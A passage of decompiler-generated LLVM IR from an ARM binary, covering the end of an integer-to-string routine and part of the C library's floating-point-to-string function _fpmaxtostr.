  %v0_16148 = phi i32 [ %v0_16130.pr, %dec_label_pc_16130thread-pre-split ], [ %v0_16128, %.thread ]
  %v2_16130 = icmp eq i32 %v0_16148, 0
  store i1 %v2_16130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16130, label %dec_label_pc_161a8, label %dec_label_pc_16140

dec_label_pc_16140:                               ; preds = %dec_label_pc_16130
  %v2_16144 = udiv i32 %v0_16148, %v0_161b4
  %v3_16144 = urem i32 %v0_16148, %v0_161b4
  store i32 %v2_16144, i32* %sl.global-to-local, align 4
  %v2_16164 = udiv i32 %v0_161ac, %v0_161b4
  %v3_16164 = urem i32 %v0_161ac, %v0_161b4
  %v0_16168 = load i32, i32* %sb.global-to-local, align 4
  %v2_16168 = mul i32 %v0_16168, %v3_16144
  %v2_16170 = add i32 %v2_16168, %v3_16164
  store i32 %v2_16170, i32* %r5.global-to-local, align 4
  %v0_1617c = load i32, i32* %fp.global-to-local, align 4
  %v2_1617c = mul i32 %v0_1617c, %v3_16144
  %v2_16184 = add i32 %v2_1617c, %v2_16164
  %v2_1618c = udiv i32 %v2_16170, %v0_161b4
  %v2_16194 = add i32 %v2_16184, %v2_1618c
  br label %dec_label_pc_161c0

dec_label_pc_161a8:                               ; preds = %dec_label_pc_16130
  %v2_161a8 = udiv i32 %v0_161ac, %v0_161b4
  br label %dec_label_pc_161c0

dec_label_pc_161c0:                               ; preds = %dec_label_pc_16140, %dec_label_pc_161a8
  %storemerge28 = phi i32 [ %v2_161a8, %dec_label_pc_161a8 ], [ %v2_16194, %dec_label_pc_16140 ]
  %v0_161dc = phi i32 [ %v2_161a8, %dec_label_pc_161a8 ], [ %v2_16194, %dec_label_pc_16140 ]
  %v1_161dc = phi i32 [ 0, %dec_label_pc_161a8 ], [ %v2_16144, %dec_label_pc_16140 ]
  %v2_16170.pn = phi i32 [ %v0_161ac, %dec_label_pc_161a8 ], [ %v2_16170, %dec_label_pc_16140 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_161c8 = urem i32 %v2_16170.pn, %v0_161b4
  %v2_161c4 = icmp ugt i32 %v0_161c8, 8
  %v7_161c4 = icmp eq i32 %v0_161c8, 9
  store i1 %v7_161c4, i1* %cpsr_z.global-to-local, align 1
  %v1_161cc = add i32 %v0_161c8, 48
  %v0_161d4 = load i32, i32* %r8.global-to-local, align 4
  %v1_161d4 = add i32 %v0_161d4, -1
  store i32 %v1_161d4, i32* %r8.global-to-local, align 4
  %v2_161d8 = xor i1 %v7_161c4, true
  %v3_161d8 = and i1 %v2_161c4, %v2_161d8
  %extract.t = trunc i32 %v1_161cc to i8
  br i1 %v3_161d8, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_161c0
  %v2_161c8 = add i32 %v0_161c8, %tmp11
  %extract.t9 = trunc i32 %v2_161c8 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_161c0, %bb24
  %v0_161e0.off0 = phi i8 [ %extract.t, %dec_label_pc_161c0 ], [ %extract.t9, %bb24 ]
  %v2_161dc = or i32 %v0_161dc, %v1_161dc
  %v4_161dc = icmp eq i32 %v2_161dc, 0
  store i1 %v4_161dc, i1* %cpsr_z.global-to-local, align 1
  %v3_161e0 = inttoptr i32 %v1_161d4 to i8*
  store i8 %v0_161e0.off0, i8* %v3_161e0, align 1
  %v0_161e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_161e4, label %dec_label_pc_161e8, label %dec_label_pc_16130thread-pre-split

dec_label_pc_161e8:                               ; preds = %bb25
  %v4_161e810 = zext i8 %storemerge to i32
  store i32 %v4_161e810, i32* @r3, align 4
  %v2_161ec = icmp eq i8 %storemerge, 0
  store i1 %v2_161ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_161ec, label %dec_label_pc_161e8..thread2_crit_edge, label %bb26

dec_label_pc_161e8..thread2_crit_edge:            ; preds = %dec_label_pc_161e8
  %v0_161f8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_161e8
  store i32 45, i32* @r3, align 4
  %v3_161f4 = load i32, i32* %r8.global-to-local, align 4
  %v4_161f4 = add i32 %v3_161f4, -1
  %v5_161f4 = inttoptr i32 %v4_161f4 to i8*
  store i8 45, i8* %v5_161f4, align 1
  %v6_161f4 = load i32, i32* %r8.global-to-local, align 4
  %v7_161f4 = add i32 %v6_161f4, -1
  store i32 %v7_161f4, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_161e8..thread2_crit_edge, %bb26
  %v0_161f8 = phi i32 [ %v0_161f8.pre, %dec_label_pc_161e8..thread2_crit_edge ], [ %v7_161f4, %bb26 ]
  ret i32 %v0_161f8

; uselistorder directives
  uselistorder i32 %v0_161c8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_161b4, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_160c0, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 5, 2, 6, 0, 8, 3, 4, 9, 7, 1, 10, 11 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_161c0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_160f4, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_16208 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_16214 = add i32 %arg4, 8
  %v2_16214 = inttoptr i32 %v1_16214 to i8*
  %v3_16214 = load i8, i8* %v2_16214, align 1
  %v4_16214 = zext i8 %v3_16214 to i32
  store i32 %v4_16214, i32* %sb.global-to-local, align 4
  %v1_16218 = or i32 %v4_16214, 32
  %v7_1621c = icmp eq i32 %v1_16218, 97
  store i1 %v7_1621c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_16234 = inttoptr i32 %arg4 to i32*
  %v2_16234 = load i32, i32* %v1_16234, align 4
  store i32 %v2_16234, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_1623c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1623c, i32* %r6.global-to-local, align 4
  store i32 67276, i32* %ip.global-to-local, align 4
  br i1 %v7_1621c, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_16244 = add nuw nsw i32 %v4_16214, 6
  store i32 %v2_16244, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_16254 = phi i32 [ %v0_1623c, %entry ], [ %v2_16244, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_1624c = add i32 %arg4, 12
  %v2_1624c = inttoptr i32 %v1_1624c to i32*
  %v3_1624c = load i32, i32* %v2_1624c, align 4
  store i32 %v3_1624c, i32* %r2.global-to-local, align 4
  %v1_16250 = add i32 %arg4, 4
  %v2_16250 = inttoptr i32 %v1_16250 to i32*
  %v3_16250 = load i32, i32* %v2_16250, align 4
  store i32 %v3_16250, i32* @lr, align 4
  br i1 %v7_1621c, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_16254 = urem i32 %v1_16254, 256
  store i32 %v2_16254, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_16258 = icmp slt i32 %v2_16234, 0
  %v2_16258 = icmp eq i32 %v2_16234, 0
  store i1 %v2_16258, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_16258, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_16268 = and i32 %v3_1624c, 2
  %v2_16268 = icmp eq i32 %v1_16268, 0
  store i1 %v2_16268, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_16268, label %dec_label_pc_16280, label %dec_label_pc_1628c

dec_label_pc_16280:                               ; preds = %bb205
  %v1_16280 = urem i32 %v3_1624c, 2
  %v2_16280 = icmp eq i32 %v1_16280, 0
  store i1 %v2_16280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16280, label %dec_label_pc_16290, label %dec_label_pc_1628c

dec_label_pc_1628c:                               ; preds = %dec_label_pc_16280, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_16280 ]
  %v0_1628c.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_16280 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_1628c.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_16290

dec_label_pc_16290:                               ; preds = %dec_label_pc_16280, %dec_label_pc_1628c
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_1623c, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_1623c, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_162ac = fptrunc double %arg2 to float
  %v2_162ac = bitcast float %v1_162ac to i32
  %v9_162ac = call i32 @__aeabi_dcmpeq(i32 %v2_162ac, i32 %v0_1623c, i32 %v2_162ac, i32 %v0_1623c, i32 0)
  store i32 %v9_162ac, i32* %r0.global-to-local, align 4
  %v2_162b0 = icmp eq i32 %v9_162ac, 0
  store i1 %v2_162b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_162b0, label %bb207, label %dec_label_pc_162c0

bb207:                                            ; preds = %dec_label_pc_16290
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16374

dec_label_pc_162c0:                               ; preds = %dec_label_pc_16290
  %v0_162c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_162c0, i32* @r0, align 4
  %v0_162c4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_162c4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_162d0 = call i32 @__aeabi_dcmpeq(i32 %v0_162c0, i32 %v0_162c4, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_162d0, i32* %r0.global-to-local, align 4
  %v2_162d4 = icmp eq i32 %v7_162d0, 0
  store i1 %v2_162d4, i1* %cpsr_z.global-to-local, align 1
  %v0_1631c = load i32, i32* %r5.global-to-local, align 4
  %v1_1631c = sext i32 %v0_1631c to i64
  %v2_1631c = bitcast i64 %v1_1631c to double
  br i1 %v2_162d4, label %dec_label_pc_1631c, label %dec_label_pc_162dc

dec_label_pc_162dc:                               ; preds = %dec_label_pc_162c0
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_162ec = fdiv double 0.000000e+00, %v2_1631c
  %v10_162ec = fptrunc double %v9_162ec to float
  %v11_162ec = bitcast float %v10_162ec to i32
  store i32 %v11_162ec, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_162f8 = call i32 @__aeabi_dcmplt(i32 %v11_162ec, i32 1072693248, i32 0, i32 0)
  store i32 %v4_162f8, i32* %r0.global-to-local, align 4
  %v2_162fc = icmp eq i32 %v4_162f8, 0
  store i1 %v2_162fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_162fc, label %bb208, label %dec_label_pc_16308

bb208:                                            ; preds = %dec_label_pc_162dc
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164e8

dec_label_pc_16308:                               ; preds = %dec_label_pc_162dc
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_164e8

dec_label_pc_1631c:                               ; preds = %dec_label_pc_162c0
  store i32 %v0_1631c, i32* @r0, align 4
  %v0_16320 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16320, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1632c = fptrunc double %v2_1631c to float
  %v2_1632c = bitcast float %v1_1632c to i32
  %v6_1632c = call i32 @__aeabi_dcmplt(i32 %v2_1632c, i32 %v0_16320, i32 0, i32 0)
  store i32 %v6_1632c, i32* %r0.global-to-local, align 4
  %v2_16330 = icmp eq i32 %v6_1632c, 0
  store i1 %v2_16330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16330, label %dec_label_pc_1631c..thread9_crit_edge, label %bb209

dec_label_pc_1631c..thread9_crit_edge:            ; preds = %dec_label_pc_1631c
  %v0_16350.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_1631c
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_16338 = load i32, i32* %r6.global-to-local, align 4
  %v2_16338 = sub i32 0, %v1_16338
  store i32 %v2_16338, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_16338, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1631c..thread9_crit_edge, %bb209
  %v0_16350 = phi i32 [ %v0_16350.pre, %dec_label_pc_1631c..thread9_crit_edge ], [ %v2_16338, %bb209 ]
  %v0_1634c = load i32, i32* %r5.global-to-local, align 4
  %v1_1634c = sext i32 %v0_1634c to i64
  %v2_1634c = bitcast i64 %v1_1634c to double
  %v9_16354 = fmul double %v2_1634c, 0.000000e+00
  %v10_16354 = fptrunc double %v9_16354 to float
  %v11_16354 = bitcast float %v10_16354 to i32
  store i32 %v11_16354, i32* @r2, align 4
  store i32 %v0_16350, i32* %r3.global-to-local, align 4
  store i32 %v0_1634c, i32* @r0, align 4
  store i32 %v0_16350, i32* %r1.global-to-local, align 4
  %v7_16368 = call i32 @__aeabi_dcmpeq(i32 %v0_1634c, i32 %v0_16350, i32 %v11_16354, i32 %v0_16350, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_16368, i32* %r0.global-to-local, align 4
  %v2_1636c = icmp eq i32 %v7_16368, 0
  store i1 %v2_1636c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1636c, label %dec_label_pc_163c0, label %.thread9.dec_label_pc_16374_crit_edge

.thread9.dec_label_pc_16374_crit_edge:            ; preds = %.thread9
  %v3_16374.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_16374

dec_label_pc_16374:                               ; preds = %bb207, %.thread9.dec_label_pc_16374_crit_edge
  %v3_16374 = phi i32 [ %v3_16374.pre, %.thread9.dec_label_pc_16374_crit_edge ], [ %arg4, %bb207 ]
  %v1_162b8.v0_162a45 = phi i32 [ 0, %.thread9.dec_label_pc_16374_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_16374, i32* %ip.global-to-local, align 4
  %v2_1637c = add i32 %v3_16374, 16
  %v3_1637c = inttoptr i32 %v2_1637c to i32*
  store i32 32, i32* %v3_1637c, align 4
  %v0_16384 = load i32, i32* %sb.global-to-local, align 4
  %v7_16384 = icmp eq i32 %v0_16384, 96
  store i1 %v7_16384, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_16384, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_16374
  %v5_16398 = or i32 %v1_162b8.v0_162a45, 4
  store i32 %v5_16398, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_16374, %bb210
  %v4_1639c = phi i32 [ %v5_16398, %bb210 ], [ 3, %dec_label_pc_16374 ]
  %v4_1639c.v1_162b8.v0_162a4 = select i1 %tmp274, i32 %v4_1639c, i32 %v1_162b8.v0_162a45
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33052), i32* %r3.global-to-local, align 4
  %v2_163b0 = add i32 %v4_1639c.v1_162b8.v0_162a4, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33052)
  store i32 %v2_163b0, i32* %r2.global-to-local, align 4
  %v2_163b4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_163b4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_168dc

dec_label_pc_163c0:                               ; preds = %.thread9
  %v0_163c0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_163c0, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_163c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_163c8, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_163d0 = call i32 @__aeabi_dcmplt(i32 %v0_163c8, i32 %v0_163c0, i32 0, i32 1100470148)
  store i32 %v6_163d0, i32* %r0.global-to-local, align 4
  %v2_163d4 = icmp eq i32 %v6_163d0, 0
  store i1 %v2_163d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163d4, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_163c0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_163c0, %bb211
  %v0_163dc = phi i32 [ 0, %dec_label_pc_163c0 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33028), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33028), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_16410 = icmp eq i32 %v0_163dc, 0
  br label %dec_label_pc_16400

dec_label_pc_16400:                               ; preds = %dec_label_pc_16498.dec_label_pc_16400_crit_edge, %bb212
  %v2_16408 = phi i32 [ add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33028), %bb212 ], [ %v2_16408.pre, %dec_label_pc_16498.dec_label_pc_16400_crit_edge ]
  %v0_16404 = phi i32 [ 9, %bb212 ], [ %v0_16498, %dec_label_pc_16498.dec_label_pc_16400_crit_edge ]
  %v2_16448 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_16498.dec_label_pc_16400_crit_edge ]
  store i32 %v0_163dc, i32* %r2.global-to-local, align 4
  %v1_16404 = add i32 %v0_16404, -1
  store i32 %v1_16404, i32* %sl.global-to-local, align 4
  store i32 %v2_16408, i32* @lr, align 4
  %v3_1640c = mul i32 %v1_16404, 8
  store i32 %v3_1640c, i32* %r3.global-to-local, align 4
  store i1 %v2_16410, i1* %cpsr_z.global-to-local, align 1
  %v0_16414 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16414, i32* %r0.global-to-local, align 4
  %v0_16418 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16418, i32* %r1.global-to-local, align 4
  %v2_1641c = add i32 %v3_1640c, %v2_16408
  store i32 %v2_1641c, i32* %ip.global-to-local, align 4
  %v1_16458 = inttoptr i32 %v2_1641c to i32*
  %v2_16458 = load i32, i32* %v1_16458, align 4
  %v3_16458 = sext i32 %v2_16458 to i64
  %v1_1645c = sext i32 %v0_16414 to i64
  %v2_1645c = bitcast i64 %v1_1645c to double
  br i1 %v2_16410, label %dec_label_pc_16458, label %dec_label_pc_16424

dec_label_pc_16424:                               ; preds = %dec_label_pc_16400
  %v8_16428 = bitcast i64 %v3_16458 to double
  %v9_16428 = fmul double %v2_1645c, %v8_16428
  %v10_16428 = fptrunc double %v9_16428 to float
  %v11_16428 = bitcast float %v10_16428 to i32
  store i32 %v11_16428, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_16428, i32* %r7.global-to-local, align 4
  store i32 %v0_16418, i32* %r8.global-to-local, align 4
  %v4_1643c = call i32 @__aeabi_dcmplt(i32 %v11_16428, i32 %v0_16418, i32 0, i32 1104006501)
  store i32 %v4_1643c, i32* %r0.global-to-local, align 4
  %v2_16440 = icmp eq i32 %v4_1643c, 0
  store i1 %v2_16440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16440, label %dec_label_pc_16498, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_16424
  %v1_16448 = load i32, i32* %r4.global-to-local, align 4
  %v3_16448 = sub i32 %v2_16448, %v1_16448
  store i32 %v3_16448, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16490

dec_label_pc_16458:                               ; preds = %dec_label_pc_16400
  store i32 %v0_16418, i32* @r1, align 4
  %v8_16464 = bitcast i64 %v3_16458 to double
  %v9_16464 = fdiv double %v2_1645c, %v8_16464
  %v10_16464 = fptrunc double %v9_16464 to float
  %v11_16464 = bitcast float %v10_16464 to i32
  store i32 %v11_16464, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_16464, i32* %r7.global-to-local, align 4
  store i32 %v0_16418, i32* %r8.global-to-local, align 4
  %v4_16478 = call i32 @__aeabi_dcmpge(i32 %v11_16464, i32 %v0_16418, i32 0, i32 1100470148)
  store i32 %v4_16478, i32* %r0.global-to-local, align 4
  %v2_1647c = icmp eq i32 %v4_16478, 0
  store i1 %v2_1647c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1647c, label %dec_label_pc_16498, label %dec_label_pc_16484

dec_label_pc_16484:                               ; preds = %dec_label_pc_16458
  %v1_16488 = load i32, i32* %r4.global-to-local, align 4
  %v2_16488 = add i32 %v1_16488, %v2_16448
  store i32 %v2_16488, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16490

dec_label_pc_16490:                               ; preds = %.thread10, %dec_label_pc_16484
  %stack_var_-192.2 = phi i32 [ %v2_16488, %dec_label_pc_16484 ], [ %v3_16448, %.thread10 ]
  %v0_16490 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16490, i32* %r5.global-to-local, align 4
  %v0_16494 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16494, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16498

dec_label_pc_16498:                               ; preds = %dec_label_pc_16424, %dec_label_pc_16458, %dec_label_pc_16490
  %stack_var_-192.3 = phi i32 [ %v2_16448, %dec_label_pc_16458 ], [ %stack_var_-192.2, %dec_label_pc_16490 ], [ %v2_16448, %dec_label_pc_16424 ]
  %v0_16498 = load i32, i32* %sl.global-to-local, align 4
  %v2_16498 = icmp eq i32 %v0_16498, 0
  store i1 %v2_16498, i1* %cpsr_z.global-to-local, align 1
  %v0_1649c = load i32, i32* %r4.global-to-local, align 4
  %v3_1649c = sdiv i32 %v0_1649c, 2
  store i32 %v3_1649c, i32* %r4.global-to-local, align 4
  br i1 %v2_16498, label %dec_label_pc_164a4, label %dec_label_pc_16498.dec_label_pc_16400_crit_edge

dec_label_pc_16498.dec_label_pc_16400_crit_edge:  ; preds = %dec_label_pc_16498
  %v2_16408.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_16400

dec_label_pc_164a4:                               ; preds = %dec_label_pc_16498
  %v0_164a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_164a4, i32* @r0, align 4
  %v0_164a8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_164a8, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_164b4 = call i32 @__aeabi_dcmpge(i32 %v0_164a4, i32 %v0_164a8, i32 0, i32 1104006501)
  store i32 %v6_164b4, i32* %r0.global-to-local, align 4
  %v2_164b8 = icmp eq i32 %v6_164b4, 0
  store i1 %v2_164b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164b8, label %dec_label_pc_164e8, label %dec_label_pc_164c0

dec_label_pc_164c0:                               ; preds = %dec_label_pc_164a4
  %v0_164c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_164c0 = sext i32 %v0_164c0 to i64
  %v2_164c0 = bitcast i64 %v1_164c0 to double
  %v0_164c4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_164c4, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_164d0 = fdiv double %v2_164c0, 0.000000e+00
  %v10_164d0 = fptrunc double %v9_164d0 to float
  %v11_164d0 = bitcast float %v10_164d0 to i32
  store i32 %v11_164d0, i32* %r0.global-to-local, align 4
  store i32 %v11_164d0, i32* %r5.global-to-local, align 4
  %v1_164e0 = add i32 %stack_var_-192.3, 1
  store i32 %v1_164e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164e8

dec_label_pc_164e8:                               ; preds = %dec_label_pc_164c0, %bb208, %dec_label_pc_164a4, %dec_label_pc_16308
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_164a4 ], [ -1, %dec_label_pc_16308 ], [ -1, %bb208 ], [ %v1_164e0, %dec_label_pc_164c0 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_164ec = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_164ec, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_164f0

dec_label_pc_164f0:                               ; preds = %dec_label_pc_16568, %dec_label_pc_164e8
  %v0_164f0 = load i32, i32* %r6.global-to-local, align 4
  %v0_164f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_164f8 = sext i32 %v0_164f4 to i64
  %v2_164f8 = bitcast i64 %v1_164f8 to double
  %v3_164f8 = fptoui double %v2_164f8 to i32
  store i32 %v3_164f8, i32* %r8.global-to-local, align 4
  store i32 %v3_164f8, i32* %r2.global-to-local, align 4
  store i32 %v0_164f0, i32* %r3.global-to-local, align 4
  store i32 %v0_164f4, i32* @r0, align 4
  store i32 %v0_164f0, i32* %r1.global-to-local, align 4
  %v6_16514 = call i32 @__aeabi_dsub(i32 %v0_164f4, i32 %v0_164f0, i32 %v3_164f8, i32 %v0_164f0)
  %v7_16514 = sext i32 %v6_16514 to i64
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v3_16520 = bitcast i64 %v7_16514 to double
  %v9_16520 = fmul double %v3_16520, 0.000000e+00
  %v10_16520 = fptrunc double %v9_16520 to float
  %v11_16520 = bitcast float %v10_16520 to i32
  store i32 %v11_16520, i32* %r0.global-to-local, align 4
  %v0_16524 = load i32, i32* %sl.global-to-local, align 4
  %v1_16524 = add i32 %v0_16524, 9
  store i32 %v1_16524, i32* %sl.global-to-local, align 4
  store i32 %v11_16520, i32* %r5.global-to-local, align 4
  store i32 %v0_164f0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_16534.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16534

dec_label_pc_16534:                               ; preds = %dec_label_pc_16534.dec_label_pc_16534_crit_edge, %dec_label_pc_164f0
  %v1_16548 = phi i32 [ %v1_16548.pre, %dec_label_pc_16534.dec_label_pc_16534_crit_edge ], [ %v1_16524, %dec_label_pc_164f0 ]
